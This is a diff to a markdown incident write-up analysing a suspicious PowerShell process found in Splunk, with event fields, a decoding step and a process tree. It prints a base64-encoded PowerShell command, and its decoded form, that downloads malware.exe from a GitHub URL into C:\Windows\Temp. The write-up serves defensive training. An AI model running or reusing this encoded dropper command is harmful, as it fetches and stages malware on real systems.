@@ -46,9 +46,10 @@ The Splunk query identified a PowerShell process executed by the `Administrator`
 | **Process Path** | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | Path of the PowerShell executable |
 | **Creator Process ID** | `0xf08` (Decimal: `3848`) | PID of the parent/creator process |
 | **Creator Process Name** | `powershell.exe` | Parent process |
-| **Process_Command_Line** |  `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBzAC0AYQBuAGoAZQBlAHYALwBzAG8AYwAtAHAAcgBvAGoAZQBjAHQAcwAvAGIAbABvAGIALwBtAGEAaQBuAC8AMAAzAC0ATQBhAGwAdwBhAHIAZQAtAEEAbgBhAGwAeQBzAGkAcwAvAGMAYQBzAGUALQAwADEALQBwAG8AdwBlAHIAcwBoAGUAbABsAC0AZAByAG8AcABwAGUAcgAvAHMAYQBtAHAAbABlAC8AbQBhAGwAdwBhAHIAZQAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAbQBhAGwAdwBhAHIAZQAuAGUAeABlACIA
-` |  Encoded Command Execution |     
-    
+| **Process_Command_Line** |  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBzAC0AYQBuAGoAZQBlAHYALwBzAG8AYwAtAHAAcgBvAGoAZQBjAHQAcwAvAGIAbABvAGIALwBtAGEAaQBuAC8AMAAzAC0ATQBhAGwAdwBhAHIAZQAtAEEAbgBhAGwAeQBzAGkAcwAvAGMAYQBzAGUALQAwADEALQBwAG8AdwBlAHIAcwBoAGUAbABsAC0AZAByAG8AcABwAGUAcgAvAHMAYQBtAHAAbABlAC8AbQBhAGwAdwBhAHIAZQAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAbQBhAGwAdwBhAHIAZQAuAGUAeABlACIA
+|  Encoded Command Execution |     
+
+## Decode Command
 **Lets Decode Executed Command Using cyberchef.io**    
 The decoded PowerShell command revealed an attempt to download `malware.exe` from a GitHub repository and save it to `C:\Windows\Temp\malware.exe`. The use of `-EncodedCommand`provided an additional layer of obfuscation.   
 
@@ -64,3 +65,30 @@ Actual Command executed was `Invoke-WebRequest -Uri "https://github.com/s-anjeev
 - **Payload:** The file being retrieved is an executable named `malware.exe`.
 - **File Staging:** The downloaded executable is saved to: `C:\Windows\Temp\malware.exe`
 - **Obfuscation:** The command was originally executed using PowerShell's `-EncodedCommand` parameter, which concealed the actual command from the initial process command line.
+
+
+## Process Tree Analysis  
+With the parent and child process IDs identified, we can now trace the execution chain to understand how the suspicious PowerShell activity originated.   
+The investigation revealed the following execution chain:
+
+explorer.exe  
+PID: 0x1164  
+    │  
+    └── WindowsTerminal.exe    
+        PID: 0xba0   
+            │   
+            └── powershell.exe   
+                PID: 0xf08  
+                    │  
+                    └── powershell.exe  
+                        PID: 0x5dc  
+                        └── Encoded PowerShell Command     
+
+The process creation events were correlated using the `Creator Process ID` and `New Process ID` fields. The timestamps show the following execution sequence:  
+
+| Time | Parent Process | Parent PID | Child Process | Child PID |
+|---|---|---:|---|---:|
+| `12:39:24.721` | `explorer.exe` | `0x1164` | `WindowsTerminal.exe` | `0xba0` |
+| `12:39:27.462` | `WindowsTerminal.exe` | `0xba0` | `powershell.exe` | `0xf08` |
+| `12:39:43.372` | `powershell.exe` | `0xf08` | `powershell.exe` | `0x5dc` |   
+
